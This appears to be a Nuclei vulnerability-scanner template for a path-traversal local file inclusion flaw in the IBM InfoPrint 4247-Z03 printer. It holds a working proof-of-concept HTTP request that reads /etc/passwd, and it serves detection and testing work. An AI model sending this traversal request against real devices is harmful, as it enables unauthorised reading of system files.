# Nuclei Template: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Local File Inclusion
**Template ID:** ibm-infoprint-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`ibm-infoprint-lfi.yaml`)

## Vulnerability Information & PoC

## Description
IBM InfoPrint 4247-Z03 Impact Matrix Printer is subject to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/./../../../../../../../../../../etc/passwd
```

## References
- https://www.exploit-db.com/exploits/47835
